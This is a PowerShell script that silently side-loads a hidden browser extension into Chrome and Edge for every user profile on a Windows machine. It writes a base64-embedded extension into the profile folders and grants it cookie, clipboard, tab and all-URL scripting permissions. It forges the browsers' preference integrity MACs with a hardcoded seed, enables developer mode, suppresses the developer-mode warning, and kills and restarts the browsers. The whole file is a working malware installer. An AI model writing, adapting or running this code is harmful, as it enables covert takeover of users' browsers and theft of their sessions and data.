$extension_zip = "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"




function removeEmpty {
    param($d)

    if ($d -is [System.Collections.Specialized.OrderedDictionary]) {
        $t = New-Object 'System.Collections.Specialized.OrderedDictionary'
        foreach ($key in $d.Keys) {
            $t[$key] = $d[$key]
        }

        foreach ($x in $t.Keys) {
            $y = $t[$x]

            if ($y -is [System.Collections.Specialized.OrderedDictionary]) {
                if ($y.Count -eq 0) {
                    $d.Remove($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.Remove($x)
                    }
                }
            } elseif ($y -is [hashtable]) {
                if ($y.Count -eq 0) {
                    $d.Remove($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.Remove($x)
                    }
                }
            } elseif ($y -is [System.Collections.IList]) {
                if ($y.Count -eq 0) {
                    $d.Remove($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.Remove($x)
                    }
                }
            } else {
                if (-not $y -and $y -ne $false -and $y -ne 0) {
                    $d.Remove($x)
                }
            }
        }
    } elseif ($d -is [System.Collections.IList]) {
        for ($i = $d.Count - 1; $i -ge 0; $i--) {
            $x = $i
            $y = $d[$i]

            if ($y -is [System.Collections.Specialized.OrderedDictionary]) {
                if ($y.Count -eq 0) {
                    $d.RemoveAt($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.RemoveAt($x)
                    }
                }
            } elseif ($y -is [hashtable]) {
                if ($y.Count -eq 0) {
                    $d.RemoveAt($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.RemoveAt($x)
                    }
                }
            } elseif ($y -is [System.Collections.IList]) {
                if ($y.Count -eq 0) {
                    $d.RemoveAt($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.RemoveAt($x)
                    }
                }
            } else {
                if (-not $y -and $y -ne $false -and $y -ne 0) {
                    $d.RemoveAt($x)
                }
            }
        }
    }
}

function calculateHMAC {
    param(
        [Parameter(Mandatory)]
        [object]$value_as_string,
        [Parameter(Mandatory)]
        [string]$path,
        [Parameter(Mandatory)]
        [string]$sid,
        [Parameter(Mandatory)]
        [byte[]]$seed
    )

    if ($value_as_string -is [System.Collections.IDictionary] -or $value_as_string.PSObject.TypeNames -contains 'System.Management.Automation.PSCustomObject') {
        removeEmpty -d $value_as_string
    }

    $jsonValue = $value_as_string | ConvertTo-Json -Depth 100
    $jsonValueMinified = $jsonValue -replace '\s', ''
    $jsonValueMinified = $jsonValueMinified -replace '<', '\u003C'
    $jsonValueMinified = $jsonValueMinified -replace 'u003c', 'u003C'
    $jsonValueMinified = $jsonValueMinified -replace '\\u003e', '>'

    $message = $sid + $path + $jsonValueMinified
    $hmacsha256 = New-Object System.Security.Cryptography.HMACSHA256
    $hmacsha256.Key = $seed
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($message)
    $hashBytes = $hmacsha256.ComputeHash($bytes)

    $hash = ($hashBytes | ForEach-Object { $_.ToString("x2") }) -join ''
    return $hash.ToUpper()
}

function calc_supermac {
    param(
        [string]$json_file,
        [string]$sid,
        [byte[]]$seed
    )

    $json_text = Get-Content -Path $json_file -Raw -Encoding UTF8
    $data = ConvertFrom-Json -InputObject $json_text
    $macs = $data.protection.macs

    $macsJson = $macs | ConvertTo-Json -Depth 100
    $macsJsonMinified = $macsJson -replace '\s', ''

    $super_msg = "$sid$macsJsonMinified"
   
    $hmacsha256 = New-Object System.Security.Cryptography.HMACSHA256
    $hmacsha256.Key = $seed
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($super_msg)
    $hashBytes = $hmacsha256.ComputeHash($bytes)

    $hash = ($hashBytes | ForEach-Object { $_.ToString("x2") }) -join ''
    return $hash.ToUpper()
}

function find_extensions_settings {
    param (
        [string]$user,
        [ValidateSet("edge", "chrome")]
        [string]$browser
    )

    if ($browser -eq 'chrome') {
        $files_to_check = @(
            "C:\users\$user\appdata\local\Google\Chrome\User Data\Default\Secure Preferences",
            "C:\users\$user\appdata\local\Google\Chrome\User Data\Default\Preferences"
        )
    } elseif ($browser -eq 'edge') {
        $files_to_check = @(
            "C:\users\$user\appdata\local\Microsoft\Edge\User Data\Default\Secure Preferences",
            "C:\users\$user\appdata\local\Microsoft\Edge\User Data\Default\Preferences"
        )
    } else {
        return $null
    }


    foreach ($file_path in $files_to_check) {
        if (Test-Path $file_path) {
            try {
                $json_text = Get-Content -Path $file_path -Raw -Encoding UTF8
                $data = $json_text | ConvertFrom-Json

                if ($data.PSObject.Properties.Name -contains 'extensions') {
                    if ($data.extensions.PSObject.Properties.Name -contains 'settings') {
                        return $file_path
                    }
                }
            } catch {
                continue
            }
        }
    }

    return $null
}

function add_extension {
    param(
        [string]$user,
        [string]$sid,
	[string]$browser
    )

    $edgeseed = ''
    $chromeseed=[System.Convert]::FromBase64String('50jzNthepfnc3yXY80emW0zfZnYA8C32ckoq8YohLSa3iKJQhpEM86kDE2locfPcBYI3MMkd+LpcT9nIhLUFqA==')
    
    $fileTime = [long]((([DateTime]::UtcNow).AddMinutes(-15) - [DateTime]::Parse('1601-01-01T00:00:00Z')).TotalMilliseconds * 1000)

    $extension_json = '{"account_extension_type":0,"active_permissions":{"api":["activeTab","bookmarks","clipboardRead","clipboardWrite","cookies","storage","tabs","declarativeNetRequest","scripting","declarativeNetRequestWithHostAccess"],"explicit_host":["http://*/*","https://*/*"],"scriptable_host":["\u003Call_urls>"]},"creation_flags":38,"dnr_dynamic_ruleset":{"checksum":929336130},"first_install_time":"' + $filetime + '","from_webstore":false,"granted_permissions":{"api":["activeTab","alarms","bookmarks","clipboardRead","clipboardWrite","cookies","storage","tabs","unlimitedStorage","declarativeNetRequest","scripting","declarativeNetRequestWithHostAccess"],"explicit_host":["http://*/*","https://*/*"],"scriptable_host":["\u003Call_urls>"]},"last_update_time":"' + $filetime + '","location":4,"newAllowFileAccess":true,"path":"pgkcjpgeckgohokcngngdnoacpkaenkk","service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["runtime.onInstalled","runtime.onStartup","tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'

    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    $serializer.MaxJsonLength = 67108864
    $dict_extension = $serializer.DeserializeObject($extension_json)

    $filepath = find_extensions_settings $user -browser $browser

    if (-not $filepath) {
        return
    }

    try {
        $json_text = Get-Content -Path $filepath -Raw -Encoding UTF8
        $data = $serializer.DeserializeObject($json_text)

        if (-not $data.ContainsKey('extensions')) { $data['extensions'] = @{} }
        if (-not $data['extensions'].ContainsKey('settings')) { $data['extensions']['settings'] = @{} }

        $data['extensions']['settings']['pgkcjpgeckgohokcngngdnoacpkaenkk'] = $dict_extension

        if (-not $data['extensions'].ContainsKey('ui')) { $data['extensions']['ui'] = @{} }
        $data['extensions']['ui']['developer_mode'] = $false

        $path = "extensions.settings.pgkcjpgeckgohokcngngdnoacpkaenkk"

	if ($browser -eq "chrome") {
      	    $macs = calculateHMAC $dict_extension $path $sid $chromeseed
	}
	else {
	    $macs = calculateHMAC $dict_extension $path $sid $edgeseed
	}

        if (-not $data.ContainsKey('protection')) { $data['protection'] = @{} }
        if (-not $data['protection'].ContainsKey('macs')) { $data['protection']['macs'] = @{} }
        if (-not $data['protection']['macs'].ContainsKey('extensions')) { $data['protection']['macs']['extensions'] = @{} }
        if (-not $data['protection']['macs']['extensions'].ContainsKey('settings')) { $data['protection']['macs']['extensions']['settings'] = @{} }

        $data['protection']['macs']['extensions']['settings']['pgkcjpgeckgohokcngngdnoacpkaenkk'] = $macs

	if ($browser -eq "chrome") {
            $supermac = calc_supermac $filepath $sid $chromeseed
	}
	else {
	    $supermac = calc_supermac $filepath $sid $edgeseed
	}
        $data['protection']['super_mac'] = $supermac

        $json_out = $serializer.Serialize($data)
        Set-Content -Path $filepath -Value $json_out -Encoding UTF8

    } catch {
        return $null
    }
}

function enable_dev {
    param(
        [string]$user,
        [string]$sid,
	[string]$browser
    )

    $edgeseed = ''
    $chromeseed=[System.Convert]::FromBase64String('50jzNthepfnc3yXY80emW0zfZnYA8C32ckoq8YohLSa3iKJQhpEM86kDE2locfPcBYI3MMkd+LpcT9nIhLUFqA==')

    # Load JSON serializer
    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    $serializer.MaxJsonLength = 67108864

    $filepath = find_extensions_settings $user -browser $browser

    if (-not $filepath) {
        return
    }

    try {
        $json_text = Get-Content -Path $filepath -Raw -Encoding UTF8
        $data = $serializer.DeserializeObject($json_text)


        if (-not $data.ContainsKey('extensions')) { $data['extensions'] = @{} }
        if (-not $data['extensions'].ContainsKey('ui')) { $data['extensions']['ui'] = @{} }

        $data['extensions']['ui']['developer_mode'] = $true

        $devpath = "extensions.ui.developer_mode"

	if ($browser -eq "chrome") {
      	    $devkey = calculateHMAC $true $devpath $sid $chromeseed
	}
	else {
	    $devkey = calculateHMAC $true $devpath $sid $edgeseed
	}

        # Ensure protection path exists
        if (-not $data.ContainsKey('protection')) { $data['protection'] = @{} }
        if (-not $data['protection'].ContainsKey('macs')) { $data['protection']['macs'] = @{} }
        if (-not $data['protection']['macs'].ContainsKey('extensions')) { $data['protection']['macs']['extensions'] = @{} }
        if (-not $data['protection']['macs']['extensions'].ContainsKey('ui')) { $data['protection']['macs']['extensions']['ui'] = @{} }

        # Set the HMAC
        $data['protection']['macs']['extensions']['ui']['developer_mode'] = $devkey

	if ($browser -eq "chrome") {
            $supermac = calc_supermac $filepath $sid $chromeseed
	}
	else {
	    $supermac = calc_supermac $filepath $sid $edgeseed
	}
        $data['protection']['super_mac'] = $supermac

        $json_out = $serializer.Serialize($data)
        Set-Content -Path $filepath -Value $json_out -Encoding UTF8

    } catch {
       return $null
    }
}


function Get-SidWithoutRid {
    param([string]$username)

    $ntAccount = New-Object System.Security.Principal.NTAccount($username)
    try {
        $sidObj = $ntAccount.Translate([System.Security.Principal.SecurityIdentifier])
        $sidStr = $sidObj.Value
        $sidParts = $sidStr -split '-'
        $sidWithoutRid = ($sidParts[0..($sidParts.Length - 2)] -join '-')
        return $sidWithoutRid
    }
    catch {
        return $null
    }
}

function delay_dev_mode_warning {

    $filepath = "C:\users\$user\appdata\local\Microsoft\Edge\User Data\Default\Preferences"

    if (-not (Test-Path -Path $filepath)) {
        Write-Host "No valid file found for user $user"
        return
    }

    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer

    $json_text = Get-Content -Path $filepath -Raw -Encoding UTF8
    $data = $serializer.DeserializeObject($json_text)


    if (-not $data.ContainsKey('extensions')) { $data['extensions'] = @{} }
    if (-not $data['extensions'].ContainsKey('settings')) { $data['extensions']['settings'] = @{} }
    if (-not $data['extensions'].ContainsKey('ui')) { $data['extensions']['ui'] = @{} }

    $futureDate = (Get-Date).ToUniversalTime().AddDays(7 * 12)
    $unixEpoch = [DateTime]"1970-01-01T00:00:00Z"
    $chromeEpoch = [DateTime]"1601-01-01T00:00:00Z"
    $epochDiff = ($unixEpoch - $chromeEpoch).TotalSeconds

    $fileTime = ([int64]($futureDate - $chromeEpoch).TotalSeconds * 1000000).ToString()

    $data['extensions']['ui']['dev_mode_warning_snooze_end_time'] = $fileTime

    $json_out = $serializer.Serialize($data) -replace '\s+', ''

    Set-Content -Path $filepath -Value $json_out -Encoding UTF8
}

function kill_browsers {
    $browsers = @(
        @{ Name = "chrome"; ProcessName = "chrome" },
        @{ Name = "edge"; ProcessName = "msedge" }
    )

    $killedBrowsers = @{}

    foreach ($browser in $browsers) {
        $processes = Get-Process -Name $browser.ProcessName -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }

        if ($processes) {
            foreach ($proc in $processes) {
                try {
                    $proc.Kill()
                }
                catch {
                    return $null
                }
            }
            $killedBrowsers[$browser.Name] = $true
        }
    }
    return $killedBrowsers
}

function start_browsers {
    param (
        [hashtable]$browsersToStart
    )

    $browserPaths = @{
        "chrome" = "C:\Program Files\Google\Chrome\Application\chrome.exe"
        "edge"   = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    }
    foreach ($browser in $browsersToStart.Keys) {
        if ($browsersToStart[$browser] -eq $true) {
            $exePath = $browserPaths[$browser]
            if (Test-Path $exePath) {
                Start-Process -FilePath $exePath
            } else {
                return $null
            }
        }
    }
}

function Install-ExtensionFromBase64 {
    param (
        [string]$base64Zip,
	[string] $user
    )

    $folderName = "pgkcjpgeckgohokcngngdnoacpkaenkk"

    $edgePath = "C:\Users\$user\AppData\Local\Microsoft\Edge\User Data\Default\Extensions\$folderName"
    $chromePath = "C:\Users\$user\AppData\Local\Google\Chrome\User Data\Default\Extensions\$folderName"

    $tempZipPath = [System.IO.Path]::Combine($env:TEMP, "$folderName.zip")
    $tempExtractPath = [System.IO.Path]::Combine($env:TEMP, "$folderName-unzipped")

    try {
        [IO.File]::WriteAllBytes($tempZipPath, [Convert]::FromBase64String($base64Zip))

        if (Test-Path $tempExtractPath) { Remove-Item -Path $tempExtractPath -Recurse -Force }
        Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath -Force

        # Create destination folders if they don't exist
        foreach ($dest in @($edgePath, $chromePath)) {
            if (!(Test-Path $dest)) {
                New-Item -Path $dest -ItemType Directory -Force | Out-Null
            }
            Copy-Item -Path "$tempExtractPath\*" -Destination $dest -Recurse -Force
        }
    }
    catch {
        return $null
    }
    finally {
        # Clean up temp files
        if (Test-Path $tempZipPath) { Remove-Item $tempZipPath -Force }
        if (Test-Path $tempExtractPath) { Remove-Item $tempExtractPath -Recurse -Force }
    }
}

$users = if (([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators') -or [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq 'NT AUTHORITY\SYSTEM') { 
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' | 
    Select-Object -ExpandProperty ProfileImagePath -ErrorAction SilentlyContinue | 
    Where-Object { $_ -like "$env:SystemDrive\Users\*" } | 
    Split-Path -Leaf 
} else { 
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1] 
}

$killed = kill_browsers
foreach ($user in $users) {
	$sid = Get-SidWithoutRid $user

	add_extension $user $sid 'edge'
	add_extension $user $sid 'chrome'
	Install-ExtensionFromBase64 $extension_zip $user
	Start-Sleep -Seconds 2

	enable_dev $user $sid 'edge'
	enable_dev $user $sid 'chrome'
	delay_dev_mode_warning
}

start_browsers -browsersToStart $killed
